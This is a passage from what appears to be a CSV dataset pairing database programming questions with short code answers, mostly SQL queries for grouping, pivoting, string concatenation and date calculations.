    datediff(day,date,MAX(date) over (partition by groupid order by groupid)) Daysbeforelast
from your_table
"
39239,48496,creating a single column table with a certain number pattern,"CREATE SEQUENCE sequence_name
MINVALUE value
MAXVALUE value
START WITH value
INCREMENT BY value
CACHE value;
"
16053,55259,Using Case result for case in same statement seems not to work,"SELECT  fallid, 
        fallaufndatum, 
        fallentldatum, 
        aufnahmeart,
        entlassart, 
        drg, 
        ugvwd,
        mvwd, 
        ogvwd,
        VWD,
        CASE 
            WHEN VWD = 16
            THEN 'Grün'
        END AS Status
FROM
(
    SELECT  f.fallid, 
            f.fallaufndatum, 
            f.fallentldatum, 
            f.aufnahmeart,
            f.entlassart, 
            fd.drg, 
            k.ugvwd,
            k.mvwd, 
            k.ogvwd,
            CASE
                WHEN f.fallentldatum IS NULL 
                THEN ROUND(sysdate - f.fallaufndatum, 0)
                ELSE f.fallentldatum - f.fallaufndatum
            END AS VWD
    FROM    tblfall         f
    JOIN    tblfalldrginfo  fd  ON  f.fallid = fd.fallid
    JOIN    katdrg          k   ON  fd.drg = k.code
                                AND fd.drgkatalog = k.katalog
    WHERE   (sysdate - f.fallaufndatum) <= 1000
) As X
"
8599,50894,How to show records were 3 fields match,"select *
from tab
qualify 
   count(*) 
   over (partition by field1, field2, field3) > 1
"
9327,7350,MySQL DB with multiple numbers show as rows,"select
    concat(""Type: "", roomtype,
    "" - RoomNo: "", roomno,
    "" - Features: "", group_concat(feature order by feature separator ', '))
    as result
from t1
group by roomtype, roomno
"
31535,43876,SQL Query put a word in a field instead of 0?,"SELECT
CASE WHEN F2 = '0' THEN '(No Phone Number)' ELSE F2 END AS Phone
...
"
39331,19001,How to get the products that all Warehouse exist?,"SELECT productID
FROM Inventory
WHERE quantity > 0
GROUP BY productID
HAVING COUNT(*) = (SELECT COUNT(*) FROM Warehouse)
"
10984,57391,Creating averages and detecting increases higher than x% in SQL,"WITH CTE_Prep AS 
(
    SELECT *, ROW_NUMBER() OVER (PARTITION BY Customer ORDER BY DateOnly) RN
    FROM Table1
)
,CTE_Calc AS
(
    SELECT *, Price AS TotalPrice, CAST(Price AS DECIMAL(18,2)) AS AveragePrice, CAST (0 AS DECIMAL(18,2)) AS Increase 
    FROM CTE_Prep WHERE RN = 1

    UNION ALL

    SELECT p.*
        , c.TotalPrice + p.Price AS TotalPrice 
        , CAST(CAST(c.TotalPrice + p.Price AS DECIMAL(18,2)) / p.RN AS DECIMAL(18,2)) AS AveragePrice
        , CAST(CAST(CAST(c.TotalPrice + p.Price AS DECIMAL(18,2)) / p.RN AS DECIMAL(18,2)) / c.AveragePrice AS DECIMAL(18,2)) AS Increase
    FROM CTE_Calc c
    INNER JOIN CTE_Prep p ON c.RN + 1 = p.RN  AND p.Customer = c.Customer
)
SELECT * FROM CTE_Calc
WHERE Increase > 1.10
"
27171,58387,MySQL Query to select last record for each of the past 7 days,"SELECT tracking.* FROM tracking
INNER JOIN 
    (SELECT MAX(lastChecked) AS maxLastChecked, id FROM tracking 
    WHERE DATEDIFF(lastChecked,NOW())<=7
        GROUP BY DAY(lastChecked)) as Lookup ON Lookup.id = tracking.id
            WHERE tracking.propertyID = 1 ORDER BY tracking.lastChecked ASC
"
13627,47988,"How to convert Oracle ""TIME"" to JDBC Time in query?","String sql = ""Select to_date('1970-01-01 ' || ? ,'YYYY-MM-DD HH24:MI:SS) as MY_TIME from dual"";
Connection conn = null; //get Connection from somewhere
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setString(1, ""16:31:59"");
ResultSet rs = stmt.executeQuery();
rs.next(); //get to first element of result set;
java.sql.Time myTime = rs.getTime(1);
"
8596,56706,Retrieve values from a column in order of appearance and priority,"SELECT top 1 * 
FROM dbo.whatever
order by case when ColumnName = 'Value X' then 1
              when ColumnName = 'Value Y' then 2
              when ColumnName = 'Value Z' then 3
              else 4
         end
"
28550,29123,haversine formula definition for sql,"SELECT id, ( 3959 * acos( cos( radians(Lat1) ) * cos( radians( Lat2 ) ) * cos( radians(Lng2) - radians(Lng1) ) + sin( radians(Lat1) ) * sin( radians(Lat2)))) AS distance 
FROM     markers 
HAVING distance < 25 
ORDER BY distance 
LIMIT 0 , 20;
"
28704,48015,SQL Server: display only rows where conditional concatinated column is not null,"SELECT * FROM (
  SELECT DISTINCT
  CONVERT (varchar(24), [LWEmail].[ID]) AS LogBatch,
  STUFF((SELECT CAST(', ' + LWEmail2.Email  AS VARCHAR(MAX))
         FROM   [LWEmail] AS LWEmail2
         WHERE  LWEmail2.[ID] = [LWEmail].[ID] and [MustUse] = 1
         FOR XML PATH('')), 1,2,'') AS Emails
  FROM   [LWEmail]
) t
where Emails is not null
"
16444,1965,SQL return a comma separated value list,"SELECT ta.IDA, ta.ValueA, stuff((
    SELECT ', ' + cast(ValueB as varchar(max))
    FROM @TableB tb INNER JOIN @TableC tc ON tc.fIDB = tb.IDB
    WHERE tc.fIDA = ta.IDA
    FOR XML PATH('')
    ), 1, 2, '') AS Options
FROM @TableA ta
"
23485,27235,how to change structure of multiple tables at once in sql,"    private static final String ALTER_USER_TABLE_ColumnDetails = 
        "" ADD NEW_COLUMN_NAME TEXT"";

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) 
    {
 // strTableList - Array of Table Names
       for(int i=0;i<strTableList.length;i++)
       {
       db.execSQL(""ALTER TABLE ""+strTableList[i]+ALTER_USER_TABLE_ColumnDetails);
       }
    }
"
28046,51755,SQL Server multi rows query with group by,"SELECT Dept
FROM   tableName
GROUP  BY DEPT
HAVING SUM(CASE WHEN [Image] = 'N' THEN 1 ELSE 0 END) = COUNT(*)
"
28147,30748,SQLite: Need a SELECT query to filter a row and sort by a value passed in WHERE condition,"SELECT distinct City from Customers where city='Cork'
union all
select * from (select distinct city from customers where city<>'Cork' order by city asc)
"
17813,14381,Collection as data type in SQL,"StudentCourseAssoc
----------------------
studentId  
courseId   
"
4145,61737,Handling IF condtions in MySQL,"SELECT CASE 
         WHEN o.item_id != 0 THEN 'ITEM'
         WHEN o.product_id != 0 THEN 'PRODUCT'
       END AS your_column_name
  FROM ORDERS o
"
1976,9500,Filtering count results in sql query,"HAVING COUNT(*) > 1
"
28232,35594,"How to manage ""groups"" in the database?","INSERT INTO BorrowerGroup() DEFAULT VALUES
SELECT SCOPE_IDENTITY()
"
22460,20900,SQL Statement Help - Select Only Customers with no order for past 3 months,";WITH CTE_LastOrder (CustomerId, LastOrderDate) As
(
SELECT CustomerId, MAX(OrderDate) LastOrderDate
FROM Orders 
GROUP By CustomerId
)
SELECT * from Customers C
JOIN CTE_LastOrder LO ON C.CustomerId = LO.CustomerId
WHERE LO.LastOrderDate > Cast(Floor(Cast(dateAdd(Month,-3, GetDate()) as Float))as DateTime) 
"
38589,74699,How to export a MySQL database to JSON?,"class Student(object):
    '''The model, a plain, ol python class'''
    def __init__(self, name, email, enrolled):
        self.name = name
        self.email = email
        self.enrolled = enrolled

    def __repr__(self):
        return ""<Student(%r, %r)>"" % (self.name, self.email)

    def make_dict(self):
        return {'name': self.name, 'email': self.email}



import sqlalchemy
metadata = sqlalchemy.MetaData()
students_table = sqlalchemy.Table('students', metadata,
        sqlalchemy.Column('id', sqlalchemy.Integer, primary_key=True),
        sqlalchemy.Column('name', sqlalchemy.String(100)),
        sqlalchemy.Column('name', sqlalchemy.String(100)),
        sqlalchemy.Column('enrolled', sqlalchemy.Date)
    )

# connect the database.  substitute the needed values.
engine = sqlalchemy.create_engine('mysql://user:pass@host/database')

# if needed, create the table:
metadata.create_all(engine)

# map the model to the table
import sqlalchemy.orm
sqlalchemy.orm.mapper(Student, students_table)

# now you can issue queries against the database using the mapping:
non_students = engine.query(Student).filter_by(enrolled=None)

# and lets make some json out of it:
import json
non_students_dicts = ( student.make_dict() for student in non_students)
students_json = json.dumps(non_students_dicts)
"
38557,19190,How do I aggregate numbers from a string column in SQL,"select
  t.cid
  , cast(sum(s.a) as varchar(5)) + 
      ' out of ' + 
      cast(sum(s.b) as varchar(5)) as sum
  , ((cast(sum(s.a) as decimal))/sum(s.b))*100 as percentage
from MyTable t
  inner join 
  (select
    id
    , cast(substring(score,0,2) as Int) a
    , cast(substring(score,charindex('out of', score)+7,len(score)) as int) b
   from MyTable
   ) s on s.id = t.id
group by t.cid
"
31328,62338,Split Comma Seperated Values into Rows with SQL Server,"delete from names n
    where exists (select 1
                  from names n2
                  where ',' + n2.nicknames + ',' like '%,' + n.name + ',%' and
                        n2.nameid <> n.nameid
                 );
"
32574,55693,How to create a table using insert so columns are nullable?,"WITH    cte ( a )
        AS ( SELECT   CAST(1 AS INT)
        UNION ALL
        SELECT   2
            )
SELECT * INTO a_tmp FROM cte
"
18149,58864,SQL best way to subtract a value of the previous row in the query?,"SELECT SUM(a.StartTime - a.LagEnd) as LostTime 
FROM (SELECT [PlantID], [StartTime], [EndTime], 
             LAG([PlantID]) OVER (ORDER BY PlantID, StartTime) LagPlantID,
             LAG([EndTime]) OVER (ORDER BY PlantID, StartTime) LagEnd 
      FROM MachineRecords) a 
WHERE a.PlantID = a.LagPlantID
"
16940,60901,Need to get most recent added record where certain columns are duplicate from a table,"SELECT id, columnA, columnB, email, isPublic
FROM (
  SELECT id, columnA, columnB, email, isPublic,
         ROW_NUMBER() OVER (PARTITION BY columnA, columnB 
                            ORDER BY id DESC) AS rn
  FROM mytable) t
WHERE t.rn = 1
"
33603,37824,SQLite not getting double data,"SELECT ID
FROM Ideas
WHERE NOT EXISTS (SELECT 1
                  FROM Ratings
                  WHERE userID = 1
                    AND ideaID = Ideas.ID)
"
23182,41298,Fetch data from 2 tables without relationship in doctrine,"    $queryBuilder = $this->_em->createQueryBuilder();       
    $queryBuilder->addSelect(""position,candidate"")
        ->from(""RadsphereRecruitmentBundle:Position"", 'position')
        ->from(""RadsphereRecruitmentBundle:Candidate"", 'candidate')
        ->andWhere(""position.open = :open"")
        ->setParameter(""open"",true);

    return $queryBuilder->getQuery()->getResult();
"
23004,26656,SQL get the row with highest amount created first,"select bid.*
from (select itemid,
             substring_index(group_concat(id order by amount desc, updateddate asc, tiebreak desc), ',', 1) as id
      from bid
      group by itemid
     ) b join
     bid
     on b.itemid = bid.itemid and b.id = bid.id;
"
29731,73407,order-by case sorting in t-sql,"select orderid, shippeddate, case when shippeddate is null  then 1 else 0 end as [SortCol1]
from sales.orders
where custid = 20
order by SortCol1, shippeddate;
"
11938,27502,Prevent slow INNER JOIN in Django model calls when unnecessary,"class Book(models.Model):

    (...)

    class Meta:
        ordering = ['author', 'title']
"
32337,18811,Comparing data in a SQL table with historical data in the same table,"SELECT SRC.DATE, A.VALUE, B.VALUE 
FROM
(
    SELECT '2015-01-01' AS DATE UNION ALL 
    SELECT '2015-02-01' UNION ALL 
    SELECT '2015-03-01' UNION ALL 
    SELECT '2015-04-01' UNION ALL 
    SELECT '2015-05-01' UNION ALL 
    SELECT '2015-06-01' UNION ALL 
    SELECT '2015-07-01' UNION ALL 
    SELECT '2015-08-01' UNION ALL 
    SELECT '2015-09-01' UNION ALL 
    SELECT '2015-10-01' UNION ALL 
    SELECT '2015-11-01' UNION ALL 
    SELECT '2015-12-01'
) SRC
LEFT JOIN AGGREGATOR A ON SRC.DATE = A.DATE
LEFT JOIN AGGREGATOR B ON SRC.DATE = DATE(B.DATE, '+1 year');
"
31879,1463,MySQL: how to pivot unknown name-value pairs?,"DROP PROCEDURE myProc;
delimiter $$
CREATE PROCEDURE myProc ()
BEGIN
    DECLARE this_name varchar(20);
    DECLARE done INT DEFAULT 0;
    DECLARE cur1 CURSOR FOR SELECT distinct name FROM user_info;
    DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = 1;

    SET @sql='select user_info_1.user_id';
    OPEN cur1;
    read_loop: LOOP
        FETCH cur1 INTO this_name;
        IF  done THEN 
            LEAVE read_loop;
        END IF;

        SET @sql=CONCAT(@sql, "", (select value from user_info where user_info.user_id = user_info_1.user_id and user_info.name = '"", this_name, ""') as '"", this_name, ""'"");
    END LOOP;
    SET @sql=CONCAT(@sql, ' from (select distinct user_id from user_info) user_info_1');
    PREPARE s1 FROM @sql;
    EXECUTE s1;
    DEALLOCATE PREPARE s1;
END$$
"
23953,32312,ACCESS 2007: Determine maximum value per row across multiple columns,"select
  EmployeeColumn,
  iff(iif(Date1 > Date2, Date1, Date2) > Date3, iif(Date1 > Date2, Date1, Date2), Date3)
from yourTable
"
32187,7938,SQL Server stored procedure for randomly assigning survey,"/* Assign 1 random survey to each teacher */
INSERT INTO TeacherSurvey
    (teacherID, surveyID)
    SELECT teacherID, (SELECT TOP 1 surveyID FROM Survey ORDER BY NEWID())
        FROM Teacher

/* Randomly choose 5 students for each teacher */
INSERT INTO TeacherStudentSurvey
    (teacherID, studentID)
    SELECT teacherID, studentID
        FROM (SELECT teacherID, studentID,
                     ROW_NUMBER() OVER(PARTITION BY teacherID ORDER BY NEWID()) AS RowNum
                  FROM TeacherStudent) t
        WHERE t.RowNum <= 5
"
4607,48857,Fetch string from dashed string in SQL Server,"Demo SQL Fiddle
create table tbl1 (vdocno varchar(200))

insert into tbl1 values('Abcd-67-Hji-kok-74-Kio')
insert into tbl1 values('Bki-6kdi7-jhfi-Hfjdji-koikk-7ji4-Kloio')

select vdocno,
reverse(substring(
    reverse(substring(vdocno, 1, LEN(vdocno) - CHARINDEX('-',REVERSE(vdocno)))), 
         1, CHARINDEX('-',
                        reverse(substring(vdocno, 1, LEN(vdocno) - CHARINDEX('-',REVERSE(vdocno))))
                     ) 
         - 1))
from tbl1
"
37486,71879,UPDATE script that runs with SQL-Server as well with PostgreSQL,"UPDATE address a
SET countrycode = (
      SELECT s.isocode
      FROM country s
      WHERE a.idcountry = s.id
);
"
14453,8007,Issue with subquery referencing outer columns,"SELECT
mi1.first_name AS first_name,
mi1.last_name AS last_name,
t2.max_max_date
FROM
member_info as mi1 
INNER JOIN member_enterprise as me1 on(me1.member_id = mi1.id) 
LEFT JOIN customer_info as ci on(ci.id = mi1.customer_info_id)
LEFT JOIN     (SELECT id, MAX(max_date) as max_max_date FROM    
    (   SELECT mi2.id as id, MAX(mi2.last_updated_dts) AS max_date 
        FROM member_info AS mi2
        GROUP BY mi2.id 
     UNION ALL 
        SELECT lt.me_id,MAX(lt.created_dts) 
        FROM live_training as lt 
        GROUP BY lt.me_id 
     UNION ALL 
        SELECT gm.me_id, MAX(gm.created_dts) 
        FROM group_member as gm 
        GROUP BY gm.me_id 
     UNION ALL 
        SELECT clm.me_id, MAX(clm.created_dts) 
        FROM contact_list_member as clm 
        GROUP BY clm.me_id 
     UNION ALL 
        SELECT mc.me_id, MAX(mc.created_dts) 
        FROM member_case as mc 
        GROUP BY mc.me_id 
     UNION ALL 
        SELECT mc.me_id, MAX(mcc.created_dts) 
        FROM member_case_comment as mcc INNER JOIN member_case as mc ON (mcc.member_case_id = mc.id) 
        GROUP BY mc.me_id
     ) as t
GROUP BY Id
) as t2
ON t2.Id=me1.me_id
WHERE me1.ent_id = 3
GROUP BY me1.id, mi1.first_name, mi1.last_name
"
30393,54009,What's the table name for a defined name in the scope of a worksheet?,"SELECT * FROM myname
SELECT * FROM [worksheet1$myname]
SELECT * FROM [worksheet2$myname]
"
2265,28518,"SQL - ""IF"" in Where Clause","SELECT * 
FROM   theTable 
WHERE   
   (@flagA = 0 or (@flagA = 1 AND theTable.A = 1 ))
    and (@flagB = 0 or (@flagB = 1 AND theTable.B = 1 ))
    and (@flagC = 0 or (@flagC = 1 AND theTable.CValue = @cValue ))
"
25868,64006,SQL: Not Like produces different results than what would be Like's opposite,"areaid areaname townname
 1        AA      AA
 1        AA      BB
"
11447,72747,SQL. Possible to see each individual ID after group by?,"DECLARE @table TABLE (ID INT, TaskId INT,Purposecode INT,UserId INT, Time Numeric(5,1))
INSERT INTO @TABLE SELECT 1, 1, 915, 421, 7.0
INSERT INTO @TABLE SELECT 2, 1, 915, 421, 7.0
INSERT INTO @TABLE SELECT 3, 1, 915, 421, 7.0
INSERT INTO @TABLE SELECT 4, 4, 912, 421, 7.0
INSERT INTO @TABLE SELECT 5, 4, 912, 421, 7.0


SELECT TaskId, Purposecode, UserId, SUM(Time) AS Time,

    STUFF(
        (SELECT ',' + CAST(T2.ID AS VARCHAR(10)) 
        FROM @table T2
        WHERE T.Purposecode = T2.Purposecode
            AND T.TaskId = T2.TaskId
            AND T.UserId = T2.UserId
        FOR XML PATH('')
        ), 1, 1, ''
    ) AS UniqueIDs

FROM @table AS T
GROUP BY TaskId, Purposecode, UserId
"
34133,60603,MySQL loops in phpMyAdmin,"INSERT INTO TableB (unum, snum)
SELECT unum, snum
FROM tableA
"
35358,20851,CakePHP has and belongs to many conditions with NOT EXISTS,"//selecting the products in the productcs_pages table
$productsWithPages = /* query to get them*/

//getting an array of IDs
$productsWidthPagesIds = Hash::extract($productsWithPages, '{n}.Product.id');

//doing the NOT IN to select products without pages
$productsWithoutPages= $this->Product->find('all', 
        array('conditions' => 
             array( 'NOT' => array('Product.id' => $productsWidthPagesIds )
        )
);
"
3655,2230,SQL Server 2008 concatenate rows to column,"SELECT FormKey,
       Stuff((SELECT ',' + Value
              FROM   Result b
              WHERE  a.FormKey = b.FormKey
                     AND a.Category = b.Category
              FOR xml path('')), 1, 1, '') value,
       Category
FROM   Result a
GROUP  BY FormKey,
          Category 
"
24140,68575,query on connect by clause,"WITH RECURSIVE
    roots AS ( 
       SELECT parent, part1 
       FROM table2 
       JOIN table1 on parent = vic_id
       WHERE parent NOT IN (SELECT child FROM table2)),
    res AS (
       SELECT parent cur, part1 cur_part, parent ids, part1 parts
       FROM roots 
       UNION ALL
       SELECT 
             child cur, 
             part1 cur_part,
             ids||'-'||child,
             parts||'-'||part1
       FROM res
       JOIN table2 on cur = parent
       JOIN table2 on child = vic_id
    )
SELECT ids, parts
FROM res
WHERE ids like '11%';
"
35441,48981,Counting rows in multiple tables cause large delay,"SELECT 
  (SELECT COUNT(*) FROM categories), 
  (SELECT COUNT(*) FROM serverfuncs), 
  (SELECT COUNT(*) FROM clientfuncs);
"
10613,22499,SQL: how do I speed up this query,"...
where store_num is not null
and table_oid = 1234;
"
20178,67575,Summarize aggregated data,"SELECT SoftwareName, 
  SUM( CASE Country WHEN 'Canada' THEN [Count] ELSE 0 END ) AS Canada,
  SUM( CASE Country WHEN 'USA'    THEN [Count] ELSE 0 END ) AS USA,
  SUM( [Count] ) AS Total
FROM [Table] 
GROUP BY SoftwareName;
"
34184,428,restart multi-threaded perl script and close mysql connection,"#!/usr/bin/perl

use threads;
use threads::shared;

use strict; use warnings;
my $EXIT_FLAG :shared;

my $db_thread = threads->create('do_the_db_thing');
$db_thread->detach;

while ( 1 ) {
    sleep rand 10;
    $EXIT_FLAG = 1 if 0.05 > rand or time - $^T > 20;
}

sub do_the_db_thing {
    until ( $EXIT_FLAG ) {
        warn sprintf ""%d: Working with the db\n"", time - $^T;
        sleep rand 5;
    }
    # $dbh->disconnect; # here
    warn ""Exit flag is set ... restarting\n"";
    exec 'j.pl';
}
"
28187,59377,"Joining(?) or unioning(?) values from two columns in two tables, filling in the blank","Select ID,col_a,col_b,col_union, 'Len_' + col_union,Length(col_union) as Ln from 
(
Select ID,col_a,col_b,Col_c as col_union from myUnionA 
Union All
Select A_ID,a.col_a,a.col_b,Col_d as col_union from  myUnionb  as b
inner join myUnionA as a on  a.ID = b.A_ID
)a
order by ID,col_union
"
35074,561,Beginer SQL Question,"select max(id1), id2
from table
group by id2
"
12081,70216,How to set the 'where' clause on a field with comma-seperated values?,"SELECT  *
FROM    tableName
WHERE   FIND_IN_SET('value3', 'comma separated value here') > 0
"
35027,4022,how to delete '\\' entry in mysql,"You can use this query:
DELETE FROM `cat` WHERE `catname` = '\\\\';
"
20894,23822,How to deal with single quote in Word VBA SQL query?,"customerName = Replace(customerName, ""'"", ""''"")
"
14679,32801,Complex MySql query help needed,"SELECT t.id, c.id 
FROM tb_event t
INNER JOIN cr_event c ON t.id = c.eid
LEFT OUTER JOIN searchable_data s ON c.id = s.race_id

WHERE c.tfile = ''
AND s.race_id IS NULL -- This is what you need to check for
GROUP BY t.id, c.id
"
35727,15643,how to integrate electrical currents in sqlite,"create table elec (lamp char(10),on_tm int,off_tm int,current int);

insert into elec values 
('red',2,14,3),
('green',5,8,8),
('blue',6,10,2);

create view all_tms as 
select distinct on_tm
  from elec
 union 
select distinct off_tm
  from elec;

create view all_periods as
select t1.on_tm,
       (select min(t2.on_tm)
          from all_tms t2
         where t2.on_tm > t1.on_tm) off_tm
  from all_tms t1

select 
  all_periods.on_tm,
  all_periods.off_tm,
  sum(case when elec.on_tm <= all_periods.on_tm
            and elec.off_tm >= all_periods.off_tm
      then elec.current
      else 0
      end) total_current,
    group_concat(case when elec.on_tm <= all_periods.on_tm
                   and elec.off_tm >= all_periods.off_tm
     then elec.lamp
     end) lamps
from 
  all_periods,
  elec
group by
  all_periods.on_tm,
  all_periods.off_tm
"
22570,26920,Select nonexisting attributes,"SELECT attribute FROM attributes a
LEFT JOIN (SELECT * FROM product_attributes pa WHERE pa.product_id = 1 ) pa ON a.id = pa.id 
WHERE pa.id IS NULL
"
34048,29282,LPAD a column with the MAX LENGTH of that column,"SELECT LPAD(PROD_ID,
            MAX(LENGTH(PROD_ID)) OVER (),
            0)
FROM   PRODUCTS_TBL;  
"
28526,41747,"SQL Server, Select CASE with different casting","IF @id = 1 THEN
 SELECT code ...
ELSE 
 SELECT Cast(Code AS int) as Code
"
18967,2943,Creating a Random name (number) temp table,"create table #MyTempTable . . . <as whatever>

declare @sql nvarchar(max) = '
    select <whatver>
    into #temp1

    . . .

    do some more work on #temp1 if you like

    --Finally
    select * from temp1
   ';

insert into #MyTempTable
    exec(@sql);
"
864,8270,MySQL Query - multiple WHERE clause on 1 column,"SELECT
    products.*,
FROM products
INNER JOIN  product_categories ON product_category_pid = product_id
INNER JOIN  categories ON product_category_cid = category_id
INNER JOIN  manufacturers ON product_manufacturer = manufacturer_id
INNER JOIN  product_specifications ON product_specification_pid=product_id
WHERE product_active = 1  
GROUP BY product_id
HAVING COUNT(CASE WHEN product_specification_sid in (3) THEN 1 END) > 0
 AND COUNT(CASE WHEN product_specification_sid in (8,9,6,7,10,11) THEN 1 END) > 0
"
35968,8853,MySQL update if record does not exists in other table,"update table_to_update 
set some_column = 123
where id = 1
and id not in (select id from table_b)
"
5505,7085,Trigger for re-setting auto-increment of tables in phpMyadmin,"SELECT MAX(id)+1 AS max_id_plus_one FROM my_table;

ALTER TABLE my_table AUTO_INCREMENT = $max_id_plus_one;
"
17792,31233,How can I get the most recent date in SQL?,"select date
from yourtable
where 
(
    date = Convert(varchar(10), getdate(), 101)
    OR
    date IN (SELECT Max(date) 
                FROM yourtable
                WHERE date!= Convert(varchar(10), getdate(), 101))
)
"
9880,49456,Converting number to date in oracle,"select to_date('1800/12/28','yyyy/mm/dd') + 77650 from dual
"
20518,71535,How can I create a sequential SQL creation script for Oracle?,"create table Area(
ID int primary key,
Name nvarchar2(200)
);

create table Employee(
ID int primary key,
Name nvarchar2(200),
IDArea int references Area(ID)
);
"
25929,53844,Will this SQL Condition Exclude NULL Values?,"SELECT * 
FROM x
WHERE amount IS NOT NULL AND amount > 0
"
32266,22413,Select all rows where there is not a specific value in a different table,"SELECT * FROM wp_posts p 
    LEFT JOIN wp_postmeta m 
    ON p.ID = m.post_id 
    WHERE m.meta_key <> 'fizzbizz'
       OR m.metakey IS NULL
    ORDER BY p.post_date DESC;
"
23089,56175,T-SQL JOIN not bring back valid results but a separate query does,"SELECT TOP 1
    o.CustomerID 
    ,ups.UPSAccount as UPSAccount1
   ,ups.CID as UPSCID
   ,ups.Address as  UPSAddress1
   ,ups.DesiredService  UPSDesiredService1
   ,ups.Address2 as UPSAddress2
   ,ups.Suit as UPSSuite
   ,ups.city as UPSCity
   ,ups.Country as UPSCountry
   ,ups.SP as UPSState
   ,ups.Zip as UPSZip
FROM dbo.orders o 
LEFT OUTER JOIN UPSAccountInfo ups
ON ups.cid = o.customerid
WHERE o.OrderNumber = @ordernum
ORDER BY ups.date DESC
"
34700,13215,Crosstab/Pivot query in TSQL on nvarchar columns,"  SELECT t2.recordid,
         MAX(CASE WHEN t1.property = 'Name' THEN t2.value END) AS name,
         MAX(CASE WHEN t1.property = 'City' THEN t2.value END) AS city,
         MAX(CASE WHEN t1.property = 'Designation' THEN t2.value END) AS designation
    FROM TABLE2 t2
    JOIN TABLE1 t1 ON t1.id = t2.table1id
GROUP BY t2.recordid
ORDER BY t2.recordid
"
23813,2877,"Count, Having and Case statement","select bn.building_name ,
       t.*
from ( select fat.building_id ,
              sum( case when fat.percentage_used <= 0.10                                then 1 else 0 end ) as group_a ,
              sum( case when fat.percentage_used >  0.10 and fat.percentage_used < 0.50 then 1 else 0 end ) as group_b ,
              sum( case when fat.percentage_used >= 0.50 and fat.percentage_used < 1.00 then 1 else 0 end ) as group_c ,
              sum( case when fat.percentage_used >= 1.00                                then 1 else 0 end ) as group_d ,
              sum( case when fat.percentage_used is null                                then 1 else 0 end ) as group_e
       from fact_table fat
       join groups     fts on tfs.dim_project_id = fat.dim_project_id
       group by fat.building_id
     ) t
join fact_table bn on bn.building_id = t.building_id
"
15740,30922,SQL Server 2008 display city name from knowing zip code,"SELECT
  allCustomer.customerName,
  allCity.cityName
FROM Customer finder
  JOIN City finderCity
   ON finder.zipCode = finderCity.ZipCode
  JOIN City allCity
    ON finderCity.CityName = allCity.CityName
    AND finderCity.StateCode = allCity.StateCode
  JOIN Customer allCustomer
    ON allCity.ZipCode = allCustomer.ZipCode
WHERE finder.customerName = 'William'
  and allCustomer.customerName != 'William'
"
22272,52904,Search for start of string in sql query and return entire string,"DECLARE @searchString VARCHAR(MAX),
        @searchForStartChars VARCHAR(MAX),
        @searchStringStartPos INTEGER;

SET @searchString = 'My ST_Test001 testing blah';
SET @searchForStartChars = 'ST_Test';
SET @searchStringStartPos = CHARINDEX(@searchForStartChars, @searchString, 1) 

SELECT      CASE
                WHEN @searchStringStartPos = 0 THEN ''
                ELSE    CASE
                            WHEN CHARINDEX(' ', SUBSTRING(@searchString, @searchStringStartPos, LEN(@searchString)), 1) = 0 THEN SUBSTRING(@searchString, @searchStringStartPos, LEN(@searchString))
                            ELSE SUBSTRING(@searchString, @searchStringStartPos, CHARINDEX(' ', SUBSTRING(@searchString, @searchStringStartPos, LEN(@searchString)), 1) - 1)
                        END
            END AS EntireSearchString;
"
12262,5495,Find missing values,"mysql> select * from test;
+----------+-------+
| DocEntry | WebId |
+----------+-------+
| 1        | S001  |
| 2        | S002  |
| 3        | S003  |
| 4        | S005  |
| 5        | S006  |
| 6        | S007  |
| 7        | S008  |
| 8        | S010  |
+----------+-------+
8 rows in set (0,00 sec)

mysql> SELECT right(t1.webid,3) +1 as missing_WebId FROM test t1 left join test t2 on right(t1.webid,3)+1 = right(t2.webid,3) where t2.webid is null;
+---------------+
| missing_WebId |
+---------------+
| 4             |
| 9             |
| 11            |
+---------------+
3 rows in set (0,01 sec)
"
29163,40283,How can I use CONCAT_WS on grouped queries?,"SELECT qualifications, duties, GROUP_CONCAT(itemcode SEPARATOR ' ') AS itemcodes, COUNT(*) AS counter
FROM items
WHERE req_id = 1
GROUP BY qualifications, duties
"
3188,34923,Count of weekdays in a given month,"SELECT
    DATENAME(dw, Date) AS WeekDay
    ,Date
    ,ROW_NUMBER() OVER (ORDER BY Date) AS Day
FROM DateTable
WHERE DATEPART(dw, Date) NOT IN (1, 7)
ORDER BY Date
"
22449,19427,How to find the difference between two date cells of different rows in sql server 2012?,"IF EXISTS (SELECT NULL FROM information_schema.TABLES WHERE TABLE_NAME = 'tblDateTimeDifference')
    DROP TABLE tblDateTimeDifference

CREATE TABLE tblDateTimeDifference (
    starts datetime, ends datetime
)

INSERT INTO tblDateTimeDifference
    SELECT '2015-02-19 00:00:00.000', '2015-02-19 00:01:00.000' UNION
    SELECT '2015-02-19 00:01:00.000', '2015-02-19 00:02:00.000' UNION
    SELECT '2015-02-19 00:02:00.000', '2015-02-19 00:03:00.000' UNION
    SELECT '2015-02-19 00:03:30.000', '2015-02-19 00:04:00.000' UNION
    SELECT '2015-02-19 00:04:00.000', '2015-02-19 00:05:00.000' UNION
    SELECT '2015-02-19 00:05:00.000', '2015-02-19 00:06:00.000' UNION
    SELECT '2015-02-19 00:06:00.000', '2015-02-19 00:07:00.000'
;
WITH cte AS (
    SELECT ROW_NUMBER() OVER (ORDER BY starts) AS row_num, starts, ends
    FROM tblDateTimeDifference
)
SELECT a.row_num AS compare_me, b.row_num AS to_me, a.ends AS compare_me_ends, b.starts AS compare_to_me_starts, DATEDIFF(ss, a.ends, b.starts) AS gap
FROM cte a INNER JOIN cte b ON a.row_num = b.row_num - 1
"
28262,6771,"Using Left join , Union and Right Join to get a desired result","SELECT a.EffectiveDate, SUM(a.CFund) AS CFund, SUM(a.DFund) AS DFund
FROM (
    SELECT c.EffectiveDate, c.CFund, NULL AS DFund
    FROM CProduct c
    UNION ALL
    SELECT d.EffectiveDate, NULL AS CFund, d.DFund
    FROM DProduct d
) a
GROUP BY a.EffectiveDate
ORDER BY a.EffectiveDate
"
33539,41382,How to do an operation only with consecutive rows by specified field in MySQL?,"code       name     consecutive
0          a        0
2          b        1
6          g        2
8          k        3
5          e        0
4          f        1
3          c        2
1          d        3
7          h        0
9          i        1
10         j        2
"
11121,30912,SQL Query that joins one table where the second table has duplicates,"select studentid, studentname, parkingspace , count(*) dupcount
from tablea inner join tableb on tablea.studentid=tableb.parkingid
group by studentid, studentname, parkingspace having count(*)>1
"
18848,33644,Extract Both Counts AND Earliest Instance from my Dataset,"SELECT uName, COUNT(uId), MIN(PassDate)
FROM UserDetails
INNER JOIN PassDates ON PassDates.fkUser = uId
GROUP BY uName, uId
"
